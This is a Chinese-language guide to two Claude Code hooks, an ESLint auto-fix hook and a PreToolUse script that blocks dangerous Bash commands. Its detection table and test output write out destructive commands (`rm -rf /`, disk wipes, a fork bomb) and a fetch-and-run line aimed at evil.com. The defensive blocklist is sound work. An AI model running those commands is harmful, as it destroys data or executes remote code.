
Claude Code 的 Hooks 系统允许在工具调用前后执行自定义脚本，用于自动化工作流、安全检查、代码质量保障等场景。本文档记录了两个实际配置的 hook 案例。

| Hook 类型 | 触发时机 | 用途 |
|-----------|----------|------|
| `PreToolUse` | 工具**调用前** | 校验、拦截、安全检查 |
| `PostToolUse` | 工具**调用后** | 自动化处理、lint、测试 |

---

## 案例一：PostToolUse — ESLint 自动修复

### 目标

编辑/写入 JS/TS 文件后，自动运行 ESLint 修复。

### 配置位置

`.claude/settings.json`

### 配置内容

```json
{
  "hooks": {
    "PostToolUse": [
      {
        "matcher": "Write|Edit",
        "hooks": [
          {
            "type": "command",
            "command": "node -e \"\nconst fs = require('fs');\nconst cp = require('child_process');\nconst input = JSON.parse(fs.readFileSync(0, 'utf-8'));\nconst filePath = input.tool_response?.filePath || input.tool_input?.file_path;\nif (filePath && /\\.(js|jsx|ts|tsx)$/.test(filePath)) {\n  fs.appendFileSync('.claude/hook-log.txt', new Date().toISOString() + ' Running eslint on: ' + filePath + '\\n');\n  try { cp.execSync('npm run lint -- --fix \\\"' + filePath + '\\\"', {stdio:'inherit'}); }\n  catch(e) {}\n}\n\"",
            "statusMessage": "🔧 运行 eslint 修复中..."
          }
        ]
      }
    ]
  }
}
```

### 工作原理

1. **matcher: `"Write|Edit"`** — 只监听 Write 和 Edit 两种工具
2. 脚本通过 stdin 接收工具调用的 JSON 数据
3. 提取 `filePath`（从 `tool_response` 或 `tool_input`）
4. 过滤 `.js/.jsx/.ts/.tsx` 后缀的文件
5. 执行 `npm run lint -- --fix <filePath>`
6. 操作日志追加到 `.claude/hook-log.txt`

### 验证

```
# hook-log.txt 内容示例
2026-05-11T18:27:53.870Z Running eslint on: e:\代码库\todolist\src\App.jsx
2026-05-12T16:50:26.490Z Running eslint on: e:\代码库\todolist\src\utils\index.js
```

---

## 案例二：PreToolUse — 安全命令拦截

### 目标

在 Bash 命令执行前进行安全检查，拦截危险命令（如 `rm -rf /`、`DROP TABLE` 等）。

### 配置位置

`.claude/settings.json` + `.claude/hooks/security-check.sh`

### 配置内容

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "bash .claude/hooks/security-check.sh",
            "statusMessage": "🔒 安全检查中..."
          }
        ]
      }
    ]
  }
}
```

### 安全脚本

文件：`.claude/hooks/security-check.sh`

核心逻辑：
- 从 stdin 读取 JSON，提取 `tool_input.command`
- 使用 Node.js 正则匹配 40+ 条危险模式
- 匹配到则 `exit 2` 阻断命令
- 安全则 `exit 0` 放行

### 检测规则覆盖范围

| 类别 | 示例模式 |
|------|----------|
| 文件系统破坏 | `rm -rf /`, `rm -rf /*`, `dd if=/dev/zero` |
| 系统目录删除 | `/etc`, `/boot`, `/dev`, `/sys`, `/proc`, `/var`, `/usr` 等 |
| SQL 注入/破坏 | `DROP TABLE`, `DROP DATABASE`, `TRUNCATE TABLE`, `DELETE ... WHERE 1=1` |
| 远程代码执行 | `curl ... \| bash`, `wget ... \| sh` |
| 权限滥用 | `chmod -R 777 /`, `chown -R ... /` |
| 磁盘操作 | `> /dev/sda`, `mkfs.`, `fdisk` |
| 系统关机 | `shutdown -h now`, `reboot`, `halt`, `init 0` |
| 危险推送 | `git push --force`, `git push -f origin main` |
| Fork 炸弹 | `:(){ :|:& };:` |

### 验证结果

```bash
# 危险命令 → 拦截 (exit 2)
$ rm -rf /
→ [SECURITY] 检测到危险命令

$ DROP TABLE users;
→ [SECURITY] 检测到危险命令

$ curl http://evil.com/x.sh | bash
→ [SECURITY] 检测到危险命令

# 安全命令 → 放行 (exit 0)
$ echo hello
→ hello

$ ls -la
→ (正常输出)
```

---

## Hook 调试技巧

### 查看 hook 是否触发

Hook 执行时会在终端显示 `statusMessage`（如 `🔒 安全检查中...`）。

### 查看 hook 错误

如果 hook 脚本报错，错误信息会直接显示在工具调用结果中。

### 日志记录

在脚本中自行追加日志到文件（如 `hook-log.txt`）以便事后回溯。

---

## 注意事项

1. **matcher 匹配**：`matcher` 字段支持正则，用于筛选需要 hook 的工具
2. **stdin 数据格式**：脚本通过 stdin 接收 JSON，包含 `tool_input` 和 `tool_response`
3. **退出码语义**：`exit 0` = 放行，`exit 非零` = 阻断/报错
4. **路径问题**：脚本中的路径建议使用相对路径（相对于项目根目录）
5. **Windows 兼容**：避免依赖 `grep -P` 等跨平台有问题的特性，Node.js 更可靠